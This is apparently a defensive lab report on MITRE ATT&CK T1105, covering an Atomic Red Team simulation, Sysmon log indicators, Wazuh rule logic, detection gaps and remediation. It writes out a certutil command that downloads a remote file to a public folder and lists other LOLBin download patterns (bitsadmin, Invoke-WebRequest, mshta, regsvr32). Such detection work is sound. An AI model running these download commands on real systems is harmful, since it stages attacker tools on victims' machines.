# T1105 — Ingress Tool Transfer

| Field | Value |
|-------|-------|
| **ATT&CK ID** | T1105 |
| **Tactic** | Command and Control |
| **Simulation Date** | 2025-06-07 |
| **Status** | ✅ Detected |

---

## ATT&CK Description

Adversaries may transfer tools or other files from an external system into a compromised environment. Tools may be copied from an external adversary-controlled system through the command and control channel or through alternate protocols with connectivity to the victim network.

---

## Attack Objective

Download a file from a remote URL to the victim endpoint using living-off-the-land binaries (LOLBins), simulating malware staging prior to execution.

---

## Atomic Red Team Test

| Field | Value |
|-------|-------|
| **Test Number** | 1 |
| **Command** | `Invoke-AtomicTest T1105 -TestNumbers 1` |

### Test Description

Uses `certutil.exe` to download a remote file:

```cmd
certutil -urlcache -split -f http://example.com/test.txt C:\Users\Public\test.txt
```

Alternative ART tests use `bitsadmin`, `PowerShell Invoke-WebRequest`, or `curl.exe`.

### Prerequisites

- [x] Outbound HTTP allowed in lab (or local web server)
- [x] Process creation logging enabled

---

## Expected Windows Logs

| Event Source | Event ID | Description |
|--------------|----------|-------------|
| Sysmon | 1 | Process Creation (certutil.exe) |
| Sysmon | 11 | FileCreate (downloaded file) |
| Security | 4688 | Process creation (if audited) |

### Key Indicators

- CommandLine: `certutil -urlcache`, `bitsadmin /transfer`, `Invoke-WebRequest`
- Parent: cmd.exe, powershell.exe
- File written to: TEMP, Public, AppData

### Sample Log Excerpt

```
Event ID: 1 (Sysmon)
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil -urlcache -split -f http://example.com/test.txt C:\Users\Public\test.txt
```

---

## Wazuh Detection Logic

| Field | Value |
|-------|-------|
| **Rule ID** | 100106 |
| **Level** | 10 |
| **Rule File** | `custom-rules/local_rules.xml` |

### Logic Summary

- Match process creation for certutil.exe with `-urlcache` or `-verifyctl` flags
- Match bitsadmin transfer commands
- Match PowerShell DownloadString / Invoke-WebRequest to external URLs

---

## Sigma Rule

| Field | Value |
|-------|-------|
| **File** | `sigma-rules/win_ingress_tool_transfer.yml` |
| **Product** | windows |
| **Service** | sysmon |

---

## Detection Coverage

| Aspect | Status | Notes |
|--------|--------|-------|
| Built-in Wazuh | ⚠️ | Some certutil rules in community |
| Custom Wazuh | ✅ | Rule 100106 |
| Sigma Logic | ✅ | LOLBin download patterns |

**Overall:** ✅ Full

---

## Detection Gaps

- HTTPS downloads from trusted CDNs (GitHub, Microsoft) appear legitimate
- `mshta.exe`, `regsvr32 /s /u /i:https://` alternate LOLBins
- SMB copy from internal share (T1570) not covered
- Compressed/encrypted payloads evade static file inspection

---

## Remediation Recommendations

1. Block certutil.exe network usage via AppLocker/WDAC where not needed
2. Monitor for executables written to disk immediately after download
3. Deploy proxy logging and SSL inspection for egress traffic
4. Alert on Office applications spawning certutil, bitsadmin, or mshta

---

## Validation Evidence

| Artifact | Location |
|----------|----------|
| Wazuh Alert Screenshot | `screenshots/alert-T1105-download.png` |
| Atomic Execution Screenshot | `screenshots/atomic-T1105-execution.png` |
| Event Log Screenshot | `screenshots/event-T1105-process-create.png` |

---

## References

- [MITRE ATT&CK — T1105](https://attack.mitre.org/techniques/T1105/)
- [Atomic Red Team — T1105](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md)
